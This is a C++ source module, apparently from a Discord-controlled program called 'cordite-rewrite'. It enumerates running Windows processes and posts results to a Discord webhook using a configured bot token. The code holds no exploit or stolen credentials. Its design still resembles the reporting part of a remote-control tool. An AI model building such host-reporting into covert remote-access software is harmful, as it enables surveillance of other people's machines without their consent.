#ifdef ENABLE_PROCESSES
#include "commands/ProcessList.h"
#include <TlHelp32.h>
#include <sstream>
#include <thread>
#include <chrono>
#include "core/HttpClient.h"
#include "core/Config.h"
#include <iostream>

std::string WideCharToString(const WCHAR* wideStr) {
    if (!wideStr) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, nullptr, 0, nullptr, nullptr);
    if (size == 0) return "";
    std::string narrowStr(size - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, &narrowStr[0], size, nullptr, nullptr);
    return narrowStr;
}

void SendNewFollowUp(const std::string& token, const std::string& payload) {
    HttpClient httpClient(L"cordite-rewrite/1.0");
    std::wstring url = L"https://discord.com/api/v10/webhooks/" + std::wstring(config::cfg.appId.begin(), config::cfg.appId.end()) + L"/" + std::wstring(token.begin(), token.end());
    std::string response;
    bool success = httpClient.SendRequest(url, payload, config::cfg.token, "POST", "application/json", &response);
    if (!success) {
        std::cerr << "SendNewFollowUp failed: " << response << std::endl;
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
}

std::unordered_map<std::string, std::string> GetRunningProcesses(bool appsOnly) {
    std::unordered_map<std::string, std::string> processList;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return processList;
    }

    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
    if (Process32First(hSnapshot, &pe32)) {
        do {
            std::string procName = WideCharToString(pe32.szExeFile);
            std::stringstream pidStr;
            pidStr << pe32.th32ProcessID;

            if (appsOnly) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
                bool hasVisibleWindow = false;
                if (hProcess) {
                    struct EnumData { DWORD pid; bool* found; };
                    EnumData data = { pe32.th32ProcessID, &hasVisibleWindow };
                    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
                        EnumData* data = (EnumData*)lParam;
                        DWORD pid;
                        GetWindowThreadProcessId(hwnd, &pid);
                        if (pid == data->pid && GetWindow(hwnd, GW_OWNER) == nullptr && IsWindowVisible(hwnd)) {
                            *data->found = true;
                            return FALSE;
                        }
                        return TRUE;
                        }, (LPARAM)&data);
                    CloseHandle(hProcess);
                }
                if (!hasVisibleWindow) continue;
            }

            processList[pidStr.str()] = procName;
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return processList;
}
#endif